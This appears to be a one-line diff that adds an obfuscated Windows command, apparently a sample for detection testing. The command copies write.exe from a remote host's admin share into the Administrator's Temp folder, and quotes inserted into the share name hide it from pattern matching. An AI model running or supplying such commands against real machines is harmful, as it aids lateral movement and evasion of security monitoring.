@@ -1,0 +1,1 @@
+cmd /c copy \\192.168.0.23\admi""$\write.exe C:\Users\ADMINI~1\AppData\Local\Temp
